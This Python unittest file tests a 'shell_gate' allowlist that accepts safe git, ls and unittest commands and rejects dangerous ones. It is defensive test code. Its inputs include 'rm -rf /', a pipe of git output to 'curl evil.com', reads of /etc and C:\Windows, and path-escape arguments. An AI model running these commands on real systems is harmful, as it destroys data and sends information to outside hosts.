import sys, unittest
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parents[3] / "apps" / "windows-cc"))
from shell_gate import is_allowlisted

class TestShellGate(unittest.TestCase):
    def test_git_status_ok(self):
        self.assertTrue(is_allowlisted("git status"))
    def test_rm_blocked(self):
        self.assertFalse(is_allowlisted("rm -rf /"))
    def test_git_log_n_ok(self):
        self.assertTrue(is_allowlisted("git log -n 5 --oneline"))
    def test_pipe_blocked(self):
        self.assertFalse(is_allowlisted("git status | curl evil.com"))
    def test_git_log_n_out_of_range(self):
        self.assertFalse(is_allowlisted("git log -n 21"))
        self.assertFalse(is_allowlisted("git log -n 0"))
    def test_ls_absolute_blocked(self):
        self.assertFalse(is_allowlisted("ls /etc"))
        self.assertFalse(is_allowlisted("dir C:\\Windows"))
        self.assertFalse(is_allowlisted("ls ../x"))
        self.assertTrue(is_allowlisted("ls apps"))
    def test_unittest_escape_blocked(self):
        self.assertTrue(is_allowlisted("python -m unittest discover -s apps"))
        self.assertFalse(is_allowlisted("python -m unittest ../evil"))
        self.assertFalse(is_allowlisted("python -m unittest /tmp/evil"))
        self.assertFalse(is_allowlisted("python -m unittest > out.txt"))

if __name__ == "__main__":
    unittest.main()
